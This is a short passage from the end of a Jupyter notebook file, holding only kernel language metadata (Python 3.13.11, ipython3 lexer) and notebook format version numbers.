   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.13.11"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
